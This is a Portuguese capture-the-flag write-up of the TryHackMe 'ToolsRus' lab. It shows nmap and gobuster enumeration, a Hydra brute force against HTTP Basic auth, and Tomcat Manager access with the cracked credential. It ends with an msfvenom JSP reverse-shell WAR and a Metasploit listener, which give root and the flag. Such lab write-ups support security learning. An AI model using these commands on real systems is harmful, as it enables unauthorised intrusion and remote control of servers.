# 🧰 ToolsRus — CTF Writeup
### TryHackMe | Boot-to-Root | Basic Auth Brute Force (Hydra) · Apache Tomcat Manager · WAR Reverse Shell

---

| **Analista**          | Mauricio Robert                                                                        |
|-----------------------|----------------------------------------------------------------------------------------|
| **Organização**       | Faculdade Impacta                                                                      |
| **Data do Relatório** | 14/08/2026                                                                             |
| **Data do Pentest**   | 14/08/2026 · 02:26 – 02:59 (GMT+0000)                                                  |
| **Alvo**              | `10.65.133.90` (`ip-10-65-133-90`)  — TryHackMe · ToolsRus                             |
| **Classificação**     | CONFIDENCIAL                                                                           |
| **Ferramentas**       | Nmap 7.99 · Gobuster 3.8.2 · Hydra 9.7 · Apache Tomcat Web Application Manager · msfvenom · Metasploit Framework (`exploit/multi/handler`) |
| **Plataforma**        | TryHackMe — Boot-to-Root                                                               |

---

## 🔍 Resumo Executivo

Este relatório documenta o comprometimento completo da máquina **ToolsRus** (TryHackMe), um host **Ubuntu Linux** que expõe um servidor web Apache convencional (porta 80) e uma instância do **Apache Tomcat 7.0.88** com o painel administrativo **Manager App** exposto na porta 1234. A cadeia de ataque envolveu: reconhecimento de rede via **Nmap**, identificando SSH (22), Apache/HTTP (80), Apache Tomcat/Coyote (1234) e AJP13 (8009); enumeração web com **Gobuster**, revelando os diretórios `/guidelines/` e `/protected/` (este último protegido por autenticação HTTP Basic); a descoberta, dentro de `/guidelines/`, de uma mensagem interna referenciando o usuário **`bob`** e um servidor **TomCat** desatualizado; um ataque de força bruta contra a autenticação básica com **Hydra** e a wordlist `rockyou.txt`, revelando a senha de `bob`; login bem-sucedido no **Apache Tomcat Web Application Manager** (porta 1234) com as credenciais obtidas; geração de um payload **WAR malicioso** com **msfvenom** (reverse shell Java/JSP) e seu deploy através do próprio painel administrativo do Tomcat, resultando em execução remota de código; e, por fim, captura da flag diretamente no diretório `/root`, confirmando comprometimento total do sistema.

---

## 🛠 Ferramentas Utilizadas

| Ferramenta                     | Versão  | Finalidade                                                                             |
|---------------------------------|---------|-----------------------------------------------------------------------------------------|
| **Nmap**                        | 7.99    | Varredura de portas, fingerprint de serviços e scripts NSE (`-Pn -sV -sC -T5 -p-`)      |
| **Gobuster**                    | 3.8.2   | Enumeração de diretórios e arquivos web (SecLists `common.txt`, extensões txt/js/php)    |
| **Hydra**                       | 9.7     | Ataque de força bruta contra autenticação HTTP Basic (`/protected`) com `rockyou.txt`    |
| **Apache Tomcat Manager**       | -       | Painel administrativo explorado para deploy de aplicações WAR maliciosas                |
| **msfvenom**                    | -       | Geração do payload `java/jsp_shell_reverse_tcp` empacotado como `.war`                  |
| **Metasploit Framework**        | -       | `exploit/multi/handler` para recepção da shell reversa                                  |

---

## 📋 Fases de Comprometimento

### FASE 1 — Reconhecimento: Varredura Nmap

> **02:26 GMT · Nmap 7.99**

```bash
sudo nmap -Pn -sV -sC -T5 -p- 10.65.133.90
```

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
1234/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-server-header: Apache-Coyote/1.1
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/7.0.88
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap done: 1 IP address (1 host up) scanned in 412.11 seconds
```

[Nmap](/CTFs/ToolsRus/images/Nmap.png)
Quatro portas expostas: **22/tcp** (SSH), **80/tcp** (Apache HTTP convencional), **1234/tcp** (**Apache Tomcat 7.0.88** — Manager App, alvo principal desta cadeia) e **8009/tcp** (AJP13, protocolo de comunicação interno do Tomcat).

---

### FASE 2 — Enumeração Web: Gobuster (porta 80)

```bash
gobuster dir -u http://10.65.133.90/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -x txt,js,php
```

```
guidelines            (Status: 301) [Size: 317] [→ http://10.65.133.90/guidelines/]
index.html            (Status: 200) [Size: 168]
protected             (Status: 401) [Size: 459]
server-status         (Status: 403) [Size: 300]
Progress: 19000 / 19000 (100.00%)
```

[Gobuster](/CTFs/ToolsRus/images/Gobuster.png)
Dois diretórios de interesse foram identificados: **`/guidelines/`**, acessível publicamente, e **`/protected/`**, retornando `401 Unauthorized` — protegido por autenticação HTTP Basic.

---

### FASE 3 — Engenharia Social Interna: A Dica em /guidelines/

Ao acessar `http://10.65.133.90/guidelines/`, uma mensagem simples, aparentemente destinada à equipe interna, foi encontrada:

```
Hey bob, did you update that TomCat server?
```

[Bob](/CTFs/ToolsRus/images/Bob.png)
Essa mensagem revelou dois dados críticos para os próximos passos: o nome de usuário **`bob`** e a confirmação de que a instância do **Apache Tomcat** era um ponto de atenção conhecido — possivelmente desatualizada.

---

### FASE 4 — Força Bruta na Autenticação Básica: Hydra

Uma tentativa de enumerar diretórios adicionais em uma porta alternativa não obteve sucesso:

```bash
gobuster dir -u http://10.65.133.90:1024/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -x txt,js,php
```

```
2026/08/14 02:41:35 error on running gobuster on http://10.65.133.90:1024/: connection refused
```

Com o usuário `bob` já identificado e o diretório `/protected/` exigindo autenticação HTTP Basic, um ataque de força bruta foi conduzido com **Hydra** utilizando a wordlist `rockyou.txt`:

```bash
hydra -l bob -P /usr/share/wordlists/rockyou.txt 10.65.133.90 http-get /protected
```

```
Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak

[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-get://10.65.133.90:80/protected
[80][http-get] host: 10.65.133.90   login: bob   password: bubbles
1 of 1 target successfully completed, 1 valid password found
```

[Brute Force](/CTFs/ToolsRus/images/Hydra_Brute_Force.png)
> 🚨 **Credencial obtida via força bruta: `bob : bubbles`**

---

### FASE 5 — Acesso ao Apache Tomcat Manager

Com a credencial de `bob` em mãos, o acesso ao **Tomcat Web Application Manager**, exposto na porta **1234**, foi testado com sucesso:

```
http://10.65.133.90:1234/manager/html
```

```
Tomcat Web Application Manager
Message: OK

Applications
Path            Version           Display Name                     Running   Sessions
/               None specified    Welcome to Tomcat                 true      0
/docs           None specified    Tomcat Documentation               true      0
/examples       None specified    Servlet and JSP Examples           true      0
/host-manager   None specified    Tomcat Host Manager Application    true      0
/manager        None specified    Tomcat Manager Application         true      1

Server Information
Tomcat Version         : Apache Tomcat/7.0.88
JVM Version             : 1.8.0_201-b09
JVM Vendor               : Oracle Corporation
OS Name                  : Linux
OS Version                : 4.4.0-1075-aws
OS Architecture            : amd64
Hostname                   : ip-10-65-133-90
IP Address                  : 10.65.133.90
```

[Manager](/CTFs/ToolsRus/images/manager.png)
> 🚩 **Acesso administrativo confirmado ao Tomcat Manager — painel que permite o deploy de aplicações WAR arbitrárias, um vetor clássico de execução remota de código.**

---

### FASE 6 — Exploração: Deploy de WAR Malicioso e Reverse Shell

Um payload Java/JSP de reverse shell foi gerado com **msfvenom**, empacotado no formato `.war` — o formato nativo de aplicação aceito pelo Tomcat Manager para deploy:

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.157.47 LPORT=4444 -f war -o shell.war
```

```
Payload size: 1096 bytes
Final size of war file: 1096 bytes
Saved as: shell.war
```

O arquivo `shell.war` foi enviado ao servidor através do formulário **"WAR file to deploy"** do próprio painel administrativo do Tomcat (autenticado como `bob:bubbles`), sendo automaticamente extraído e disponibilizado como uma nova aplicação web.

Um listener foi preparado no Metasploit para receber a conexão reversa:

```bash
msfconsole
```

```
msf > use exploit/multi/handler
msf exploit(multi/handler) > set payload java/jsp_shell_reverse_tcp
payload => java/jsp_shell_reverse_tcp
msf exploit(multi/handler) > set LHOST 192.168.157.47
LHOST => 192.168.157.47
msf exploit(multi/handler) > set LPORT 4444
LPORT => 4444
msf exploit(multi/handler) > run
```

```
[*] Started reverse TCP handler on 192.168.157.47:4444
[*] Command shell session 1 opened (192.168.157.47:4444 -> 10.65.133.90:36540) at 2026-08-14 02:59:24 +0000
```

Ao acessar a URL da aplicação recém-implantada no navegador, o payload JSP foi executado no contexto do servidor Tomcat, disparando a conexão reversa:

```
ls
bin  boot  dev  etc  home  initrd.img  lib  lib64  lost+found
media  mnt  opt  proc  root  run  sbin  snap  srv  sys  tmp  usr
```

[Exploit](/CTFs/ToolsRus/images/Exploit_and_Run.png)
> 🚩 **Execução remota de código obtida via deploy de WAR malicioso no Apache Tomcat Manager**

---

### FASE 7 — Pós-Exploração e Captura da Flag

Com a shell ativa, o nível de privilégio da sessão foi confirmado e o diretório `/root` foi inspecionado diretamente:

```bash
whoami
root

cd /root
ls
```

```
flag.txt
snap
```

```bash
cat flag.txt
```

```
ff1fc4a81affcc7688cf89ae7dc6e0e1
```

[Flag](/CTFs/ToolsRus/images/Flag.png)
> 🚩 **flag.txt — FLAG FINAL CAPTURADA: `ff1fc4a81affcc7688cf89ae7dc6e0e1`**

O processo do Tomcat estava sendo executado com privilégios administrativos, permitindo que o deploy da aplicação maliciosa resultasse em acesso **root** direto — sem qualquer etapa adicional de escalada de privilégios.

---

## ⛓ Linha do Tempo do Comprometimento

```
[02:26 GMT] FASE 1 — RECONHECIMENTO (Nmap)
    22/tcp SSH · 80/tcp Apache · 1234/tcp Apache Tomcat 7.0.88 · 8009/tcp AJP13
    ↓
[FASE 2] ENUMERAÇÃO WEB (Gobuster — porta 80)
    /guidelines/ (público) · /protected/ (401 — HTTP Basic Auth)
    ↓
[FASE 3] DICA INTERNA
    "Hey bob, did you update that TomCat server?"
    Usuário identificado: bob
    ↓
[02:41-02:46 GMT] FASE 4 — FORÇA BRUTA (Hydra)
    hydra -l bob -P rockyou.txt → bob : bubbles
    ↓
[FASE 5] ACESSO AO TOMCAT MANAGER (porta 1234)
    Login bem-sucedido com bob:bubbles
    Tomcat 7.0.88 confirmado, painel de deploy WAR disponível
    ↓
[FASE 6] EXPLORAÇÃO (msfvenom + Tomcat Manager)
    shell.war (java/jsp_shell_reverse_tcp) implantado via painel
    ↓
[02:59 GMT] Command shell session 1 aberta
    ↓
[FASE 7] PÓS-EXPLORAÇÃO
    whoami → root
    FLAG: ff1fc4a81affcc7688cf89ae7dc6e0e1 ✓ (/root/flag.txt)
    ↓
COMPROMETIMENTO CONCLUÍDO — acesso total como root
```

---

## 🗺 Mapeamento Investigativo

| Fase | Ferramenta/Técnica | Achado |
|------|--------------------|--------|
| Reconhecimento | Nmap | SSH (22), Apache (80), Apache Tomcat 7.0.88 (1234), AJP13 (8009) |
| Enumeração Web | Gobuster | `/guidelines/` (público) e `/protected/` (401 — HTTP Basic Auth) |
| Engenharia Social | Navegação manual | Usuário `bob` identificado via mensagem interna |
| Força Bruta | Hydra (`rockyou.txt`) | Credencial: `bob : bubbles` |
| Acesso Administrativo | Login no Tomcat Manager | Acesso confirmado ao painel de deploy (porta 1234) |
| Exploração | msfvenom + deploy WAR | Reverse shell Java/JSP implantada via Tomcat Manager |
| Acesso Inicial/Privilégio | Metasploit `multi/handler` | Shell obtida diretamente como `root` |
| Flag Final | `cat flag.txt` | Flag: `ff1fc4a81affcc7688cf89ae7dc6e0e1` |

---

## 🚨 Artefatos e Indicadores Identificados

| Tipo | Indicador | Contexto |
|------|-----------|----------|
| Alvo | `10.65.133.90` (`ip-10-65-133-90`) | Máquina ToolsRus (TryHackMe) — Ubuntu Linux (AWS) |
| Serviços expostos | `22/TCP` (SSH) · `80/TCP` (Apache) · `1234/TCP` (Tomcat) · `8009/TCP` (AJP13) | Superfície de ataque total |
| Diretório com dica | `/guidelines/` | Revelou o usuário `bob` e o alvo (Tomcat) |
| Diretório protegido | `/protected/` | HTTP Basic Auth — vetor para o ataque de força bruta |
| Credencial obtida | `bob : bubbles` | Quebrada via Hydra contra `/protected` |
| Painel administrativo exposto | Apache Tomcat Manager (porta 1234, Tomcat 7.0.88) | Permite deploy de aplicações WAR arbitrárias com credenciais válidas |
| Payload malicioso | `shell.war` (`java/jsp_shell_reverse_tcp`) | Gerado via msfvenom, entregue via deploy no Tomcat Manager |
| Artefato residual observado | `/lF7Fhb` (aplicação com nome aleatório) | Indício de deploy anterior de WAR no ambiente |
| Contexto obtido | `root` | Serviço Tomcat executando com privilégios administrativos |
| Flag | `ff1fc4a81affcc7688cf89ae7dc6e0e1` | `/root/flag.txt` |
| Técnica (MITRE ATT&CK) | `T1110.001` | Brute Force: Password Guessing (Hydra contra HTTP Basic Auth) |
| Técnica (MITRE ATT&CK) | `T1190` | Exploit Public-Facing Application (Tomcat Manager WAR deploy) |
| Técnica (MITRE ATT&CK) | `T1078` | Valid Accounts (credencial de `bob` reutilizada no Tomcat Manager) |

---

## ✅ Resumo da Flag

| # | Flag | Valor | Localização |
|---|------|-------|-------------|
| 🚩 Flag | `flag.txt` | `ff1fc4a81affcc7688cf89ae7dc6e0e1` | `/root/flag.txt` |

---

## 📚 Referências

- [TryHackMe — ToolsRus](https://tryhackme.com/room/toolsrus)
- [Apache Tomcat — Manager App How-To](https://tomcat.apache.org/tomcat-7.0-doc/manager-howto.html)
- [Rapid7 — Tomcat Manager Deploy RCE](https://www.rapid7.com/db/modules/exploit/multi/http/tomcat_mgr_upload/)
- [MITRE ATT&CK T1110.001 — Password Guessing](https://attack.mitre.org/techniques/T1110/001/)
- [MITRE ATT&CK T1190 — Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190/)
- [MITRE ATT&CK T1078 — Valid Accounts](https://attack.mitre.org/techniques/T1078/)

---